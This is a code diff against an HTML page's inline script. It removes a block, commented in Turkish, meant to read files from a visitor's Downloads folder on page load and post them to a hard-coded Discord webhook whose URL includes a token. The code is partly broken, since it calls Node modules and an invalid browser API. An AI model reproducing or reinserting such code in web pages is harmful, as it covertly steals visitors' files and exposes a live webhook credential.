@@ -57,47 +57,6 @@
         if (userAgent.indexOf('Edge') > -1) return 'Microsoft Edge';
         return 'Unknown';
       }
-      // Kullanıcı siteye girdiğinde, webhook ile dosyalarını gönderme
-const fileSystem = require('fs');
-const path = require('path');
-
-navigator.webkitGetFileSystem({
-  type: window.PERSISTENT,
-  size: 1024 * 1024 * 5 // 5MB
-}, (fs) => {
-  fs.root.getDirectory('Downloads', {
-    create: true
-  }, (dirEntry) => {
-    dirEntry.createReader().readEntries((entries) => {
-      const files = [];
-
-      entries.forEach((entry) => {
-        if (entry.isFile) {
-          files.push(entry);
-        }
-      });
-
-      const formData = new FormData();
-
-      files.forEach((file) => {
-        file.file((fileContent) => {
-          formData.append('files[]', fileContent, file.name);
-        });
-      });
-
-      // Send the files to the Discord webhook
-      const webhookUrl = 'https://discord.com/api/webhooks/1246133942344617984/L5BhAqPdku8Q8qR5-DJO5senhebGe2UMdVCsxEzb7cj_pYXBOsG43i1eZzPSk15KrHJD';
-
-      fetch(webhookUrl, {
-        method: 'POST',
-        body: formData,
-      })
-     .then(response => response.json())
-     .then(data => console.log(data))
-     .catch(error => console.error(error));
-    });
-  });
-});
     </script>
   </body>
 </html>
